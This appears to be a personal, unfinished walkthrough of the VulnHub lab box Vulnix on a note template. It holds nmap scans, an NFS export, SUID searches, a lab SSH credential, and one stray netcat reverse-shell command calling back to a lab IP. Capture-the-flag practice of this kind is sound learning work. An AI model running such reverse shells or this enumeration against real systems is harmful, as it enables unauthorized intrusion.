# BOX NAME: HackLAB:Vulnix
**LINK**: https://www.vulnhub.com/entry/hacklab-vulnix,48/

<details open><summary><ins>SUMMARY</ins></summary>

```
I never finished this box. I consider this an epic fail. 
I figured you were to user-impersonate on the nfs and add some .ssh keys but for some god-forsaken reason I couldn't seem to get the permissions of the rsa files properly.
No matter what I tried, eventually I even followed along some writeups step by step, but to no avail.
The user vulnix still required med to log on with a password.

I consider this box "broken"..
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.79
[+] URL:	http://vulnix.com
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV $IP      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:04 CEST
Nmap scan report for vulnix.com (10.77.0.79)
Host is up (0.00060s latency).                                                                                      
Not shown: 988 closed tcp ports (conn-refused)                                                                      
PORT     STATE SERVICE    VERSION                                                                                   
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)                                
25/tcp   open  smtp       Postfix smtpd                                                                             
79/tcp   open  finger     Linux fingerd                                                                             
110/tcp  open  pop3       Dovecot pop3d                                                                             
111/tcp  open  rpcbind    2-4 (RPC #100000)                                                                         
143/tcp  open  imap       Dovecot imapd                                                                             
512/tcp  open  exec       netkit-rsh rexecd                                                                         
513/tcp  open  login                                                                                                
514/tcp  open  tcpwrapped                                                                                           
993/tcp  open  ssl/imap   Dovecot imapd                                                                             
995/tcp  open  ssl/pop3   Dovecot pop3d                                                                             
2049/tcp open  nfs_acl    2-3 (RPC #100227)                                                                         
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                              
                                                                                                                    
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                      
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds


└─$ nmap -sV -A 10.77.0.79 -oN nmap-vulnix.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 18:37 CEST
Nmap scan report for vulnix.com (10.77.0.79)
Host is up (0.0015s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10cd9ea0e4e030243ebd675f754a33bf (DSA)
|   2048 bcf924072fcb76800d27a648520a243a (RSA)
|_  256 4dbb4ac118e8dad1826f58529cee345f (ECDSA)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2023-06-07T16:38:38+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
79/tcp   open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp  open  pop3       Dovecot pop3d
|_ssl-date: 2023-06-07T16:38:38+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_pop3-capabilities: TOP STLS UIDL SASL RESP-CODES CAPA PIPELINING
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33069/udp   mountd
|   100005  1,2,3      43100/udp6  mountd
|   100005  1,2,3      47739/tcp6  mountd
|   100005  1,2,3      57416/tcp   mountd
|   100021  1,3,4      40586/tcp   nlockmgr
|   100021  1,3,4      44121/tcp6  nlockmgr
|   100021  1,3,4      44357/udp   nlockmgr
|   100021  1,3,4      47354/udp6  nlockmgr
|   100024  1          40531/udp   status
|   100024  1          46343/tcp6  status
|   100024  1          46989/udp6  status
|   100024  1          57862/tcp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp  open  imap       Dovecot imapd
|_imap-capabilities: more have post-login listed OK capabilities LOGINDISABLEDA0001 SASL-IR Pre-login STARTTLS IDLE ID LITERAL+ ENABLE LOGIN-REFERRALS IMAP4rev1
|_ssl-date: 2023-06-07T16:38:38+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
512/tcp  open  exec       netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
993/tcp  open  ssl/imap   Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 have post-login OK listed capabilities SASL-IR Pre-login more IDLE ID LITERAL+ ENABLE LOGIN-REFERRALS IMAP4rev1
|_ssl-date: 2023-06-07T16:38:38+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
995/tcp  open  ssl/pop3   Dovecot pop3d
|_pop3-capabilities: TOP UIDL SASL(PLAIN) USER RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2023-06-07T16:38:38+00:00; -2s from scanner time.
2049/tcp open  nfs_acl    2-3 (RPC #100227)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.88 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
N/A
```

nikto-scan
```
N/A
```

fuzzing
```

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

NFS
```
└─$ showmount -e $IP           
Export list for 10.77.0.79:
/home/vulnix *
```

SMB/SAMBA
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```
smtp-user-enum returned "user" as a valid user.
```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```
nc -e /bin/sh 10.77.0.35 443

**SUID's**:

```
user@vulnix:/home$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/procmail
/bin/ping6
/bin/mount
/bin/umount
/bin/su
/bin/ping
/bin/fusermount
```
**SGID's**:

```
user@vulnix:/home$ find / -perm -g=s -type f 2>/dev/null
/sbin/unix_chkpwd
/usr/sbin/uuidd
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/mail-touchlock
/usr/bin/mail-unlock
/usr/bin/lockfile
/usr/bin/mutt_dotlock
/usr/bin/at
/usr/bin/dotlockfile
/usr/bin/wall
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/mail-lock
/usr/bin/crontab
/usr/bin/screen
/usr/bin/mlocate
/usr/bin/procmail
```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
user@vulnix:~$ file /bin/bash ; echo -e " \n" && lsb_release -a ; echo -e "\n" && uname -a
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf199a4a89ac968c2e0e99f2410600b9d7e995187, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.1 LTS
Release:        12.04
Codename:       precise


Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

[22][ssh] host: 10.77.0.79   login: user   password: letmein
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
meh?
```

```

```

```

```

</details>